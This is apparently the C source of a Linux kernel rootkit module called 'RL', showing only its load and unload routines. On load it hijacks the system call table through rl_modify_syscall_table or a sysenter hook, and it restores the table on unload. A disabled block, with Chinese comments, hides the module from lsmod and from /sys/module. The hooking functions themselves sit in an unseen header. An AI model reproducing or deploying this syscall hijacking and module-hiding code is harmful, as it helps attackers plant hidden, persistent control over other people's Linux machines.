#include <linux/init.h>
#include <linux/module.h>
#include <linux/fs.h>
#include <linux/cdev.h>
#include <linux/syscalls.h>
#include <linux/kernel.h>
#include <linux/sched.h>
#include <linux/netdevice.h>
#include <linux/list.h>

#include "rl_syscall.h"

MODULE_LICENSE("Dual BSD/GPL");

#define SWITCH 1

static int __init rl_init(void)
{
    printk("RL Module init!\n");

#if 0
    //对lsmod命令隐藏模块名称
    mutex_lock(&module_mutex);
    list_del_init(&THIS_MODULE->list);
    mutex_unlock(&module_mutex);

    //从/sys/module/目录下隐藏模块
#ifdef CONFIG_SYSFS
    kobject_del(&THIS_MODULE->mkobj.kobj);
#endif
#endif
#if SWITCH 
    rl_modify_syscall_table();
#else
    rl_sysenter_hijack();
#endif

	return 0;
}

static void __exit rl_exit(void)
{
#if !SWITCH 
    rl_sysenter_restore();
#else
    rl_restore_syscall_table();
#endif
    printk("RL Module exit!\n");
}

module_init(rl_init);
module_exit(rl_exit);
